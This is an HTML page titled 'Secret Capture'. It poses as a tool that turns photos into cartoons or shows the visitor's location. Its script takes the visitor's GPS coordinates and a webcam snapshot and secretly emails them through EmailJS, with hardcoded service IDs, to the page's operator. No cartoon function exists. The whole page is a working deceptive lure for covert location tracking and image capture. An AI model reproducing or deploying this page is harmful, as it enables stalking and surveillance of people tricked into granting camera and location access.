<!DOCTYPE html>
<html>
  <head>
    <title>Secret Capture</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
      emailjs.init("vyxyeBFTfSi_ISmNG"); // Your Public Key

      // Send location only
      function sendLocationOnly() {
        if (!navigator.geolocation) {
          alert("Geolocation not supported");
          return;
        }

        navigator.geolocation.getCurrentPosition(async (position) => {
          const message = `Location Only:\nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`;

          await emailjs.send("service_gkkpt4w", "template_96dsagv", {
            message: message,
          });

          alert("Checking Location You will Recieve an Email Shortly");
        });
      }

      // Take picture and send with location
      async function captureAndSend() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = stream;
          await video.play();

          // Give video time to load
          await new Promise((res) => setTimeout(res, 1000));

          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d").drawImage(video, 0, 0);
          const imageBase64 = canvas.toDataURL("image/png");

          stream.getTracks().forEach((track) => track.stop());

          navigator.geolocation.getCurrentPosition(async (position) => {
            const message = `Picture Taken With Location:\nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`;

            await emailjs.send("service_gkkpt4w", "template_96dsagv", {
              message: message,
              image: imageBase64,
            });

            alert("Picture + location sent!");
          });
        } catch (err) {
          alert("Error: " + err.message);
        }
      }
    </script>
  </head>
  <body style="text-align: center; padding: 40px; font-family: Arial;">
    <h2>Turn your photos into cartoons or view your location</h2>
    <button onclick="sendLocationOnly()" style="padding: 10px 20px; margin: 10px;">Check Your Yocation</button>
    <button onclick="captureAndSend()" style="padding: 10px 20px; margin: 10px;">Make Cartoon Pic</button>
  </body>
</html>
